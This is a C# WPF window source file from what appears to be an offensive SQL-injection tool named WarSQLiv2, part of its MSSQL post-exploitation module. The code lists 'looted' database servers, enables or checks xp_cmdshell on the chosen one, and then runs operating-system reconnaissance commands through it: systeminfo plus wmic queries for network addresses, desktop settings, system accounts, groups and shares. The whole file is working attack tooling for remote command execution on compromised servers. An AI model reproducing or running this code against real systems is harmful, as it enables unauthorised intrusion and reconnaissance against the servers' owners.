using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;
using System.Windows.Threading;
using WarSQLiv2.Exploitation.Control;
using WarSQLiv2.Exploitation.PostExploitation;

namespace WarSQLiv2.UserControls.Attack.MSSQL
{
    /// <summary>
    /// Interaction logic for FrmSystemInfo.xaml
    /// </summary>
    public partial class FrmSystemInfo : Window
    {
        private readonly LanguageControl _languageControl = new LanguageControl();
        public xpCmdShellControl cmdControl = new xpCmdShellControl();
        readonly MsSqlPostExploitation _postExploitation = new MsSqlPostExploitation();
        private int _selectedId = 0;
        public FrmSystemInfo()
        {
            InitializeComponent();
        }
        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            _languageControl.FindLang();
            var lootedFileControl = new LootedFileControl();
            try
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    btnGet.Content = _languageControl.SelectedLanguage.GetString("ButtonShow");
                    cbi1.Content = _languageControl.SelectedLanguage.GetString("SysInfoContent1");
                    cbi2.Content = _languageControl.SelectedLanguage.GetString("SysInfoContent2");
                    cbi3.Content = _languageControl.SelectedLanguage.GetString("SysInfoContent3");
                    cbi4.Content = _languageControl.SelectedLanguage.GetString("SysInfoContent4");
                    cbi5.Content = _languageControl.SelectedLanguage.GetString("SysInfoContent5");
                    cbi6.Content = _languageControl.SelectedLanguage.GetString("SysInfoContent6");
                    Title = _languageControl.SelectedLanguage.GetString("TitleSystemInfo");
                    lootedFileControl.FileControl();
                    var lootedList = lootedFileControl.LootedList;
                    foreach (var t in lootedList)
                    {
                        lstLooted.Items.Add(t);
                    }

                    lstLooted.SelectedIndex = 0;
                    var toolStripControl = new ToolStripInformation
                    {
                        SelectedLootedServer = lstLooted.SelectedItem.ToString(),
                        Command = "sp_server_info",
                    };
                    toolStripControl.SqlServerInformation();
                    lblStrip.Content = string.Empty;
                    lblStrip.Content = toolStripControl.SqlServerInfo;
                });

            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(lootedFileControl.Exception);
                });
            }
        }
        private void lstLooted_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            try
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    _selectedId = 0;
                    _selectedId = lstLooted.SelectedIndex;
                    lblStrip.Content = string.Empty;
                    var toolStripControl = new ToolStripInformation
                    {
                        SelectedLootedServer = lstLooted.SelectedItem.ToString(),
                        Command = "sp_server_info",
                    };
                    toolStripControl.SqlServerInformation();
                    lblStrip.Content = toolStripControl.SqlServerInfo;
                });

            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                });

            }
        }
        private void btnGet_Click(object sender, RoutedEventArgs e)
        {
            var isActivated = cmdControl.isActivated;
            var isExecuted = cmdControl.isExecuted;
            if (isActivated == false && isExecuted == false)
            {
                var enableXpCmdShell = new EnableXpCmdShell { LootedServer = lstLooted.SelectedItem.ToString() };
                try
                {
                    enableXpCmdShell.XpCmdShellStatus();
                    txtStatus.AppendText(enableXpCmdShell.Result);
                    var cmdLandResult = _languageControl.SelectedLanguage.GetString("XPCmdShell2");
                    var contains = enableXpCmdShell.Result.Contains(cmdLandResult);
                    if (contains == true)
                    {
                        isActivated = true;
                        isExecuted = true;
                    }
                }
                catch (Exception)
                {
                    txtStatus.AppendText(enableXpCmdShell.CmdException);
                }
            }
            if (isExecuted == true && isActivated == true)
            {
                if (cmbInfo.SelectedIndex == 0)
                {
                    try
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                            _postExploitation.SqlCommand = "systeminfo";
                            _postExploitation.VolumeList = new List<string>();
                            _postExploitation.VolumeList.Clear();
                            _postExploitation.SqlExploitation();
                            txtStatus.AppendText(_postExploitation.ExploitResult);
                            for (var i = 0; i < _postExploitation.VolumeList.Count; i++)
                            {
                                txtStatus.AppendText(_postExploitation.VolumeList[i].Replace(" ", ""));
                            }
                        });
                    }
                    catch (Exception exp)
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                        });
                    }
                }
                if (cmbInfo.SelectedIndex == 1)
                {
                    try
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                            _postExploitation.SqlCommand = "wmic nicconfig get MACAddress, IPAddress";
                            _postExploitation.VolumeList = new List<string>();
                            _postExploitation.VolumeList.Clear();
                            _postExploitation.SqlExploitation();
                            txtStatus.AppendText(_postExploitation.ExploitResult);
                            for (var i = 0; i < _postExploitation.VolumeList.Count; i++)
                            {
                                txtStatus.AppendText(_postExploitation.VolumeList[i].Replace(" ", "").Replace("                       ", "").Replace("                                                                                                             ", "").Replace("  ","").Replace("\r","").Replace("\n",""));
                            }
                        });
                    }
                    catch (Exception exp)
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                        });
                    }
                }
                if (cmbInfo.SelectedIndex == 2)
                {
                    try
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                            _postExploitation.SqlCommand = "wmic desktop get Name, ScreenSaverExecutable, ScreenSaverActive, Wallpaper /format:list";
                            _postExploitation.VolumeList = new List<string>();
                            _postExploitation.VolumeList.Clear();
                            _postExploitation.SqlExploitation();
                            txtStatus.AppendText(_postExploitation.ExploitResult);
                            for (var i = 0; i < _postExploitation.VolumeList.Count; i++)
                            {
                                txtStatus.AppendText(_postExploitation.VolumeList[i].Replace(" ", ""));
                            }
                        });
                    }
                    catch (Exception exp)
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                        });
                    }
                }
                if (cmbInfo.SelectedIndex == 3)
                {
                    try
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                            _postExploitation.SqlCommand = "wmic sysaccount get Caption, Domain, Name, SID, SIDType, Status";
                            _postExploitation.VolumeList = new List<string>();
                            _postExploitation.VolumeList.Clear();
                            _postExploitation.SqlExploitation();
                            txtStatus.AppendText(_postExploitation.ExploitResult);
                            for (var i = 0; i < _postExploitation.VolumeList.Count; i++)
                            {
                                txtStatus.AppendText(_postExploitation.VolumeList[i].Replace(" ", ""));
                            }
                        });
                    }
                    catch (Exception exp)
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                        });
                    }
                }
                if (cmbInfo.SelectedIndex == 4)
                {
                    try
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                            _postExploitation.SqlCommand = "wmic group get Caption, InstallDate, LocalAccount, Domain, SID, Status";
                            _postExploitation.VolumeList = new List<string>();
                            _postExploitation.VolumeList.Clear();
                            _postExploitation.SqlExploitation();
                            txtStatus.AppendText(_postExploitation.ExploitResult);
                            for (var i = 0; i < _postExploitation.VolumeList.Count; i++)
                            {
                                txtStatus.AppendText(_postExploitation.VolumeList[i].Replace(" ", ""));
                            }
                        });
                    }
                    catch (Exception exp)
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                        });
                    }
                }
                if (cmbInfo.SelectedIndex == 5)
                {
                    try
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                            _postExploitation.SqlCommand = "wmic share get name, path, status";
                            _postExploitation.VolumeList = new List<string>();
                            _postExploitation.VolumeList.Clear();
                            _postExploitation.SqlExploitation();
                            txtStatus.AppendText(_postExploitation.ExploitResult);
                            for (var i = 0; i < _postExploitation.VolumeList.Count; i++)
                            {
                                txtStatus.AppendText(_postExploitation.VolumeList[i].Replace(" ", "").Replace("\r","").Replace("\n",""));
                            }
                        });
                    }
                    catch (Exception exp)
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                        });
                    }
                }
            }
        }
    }
}
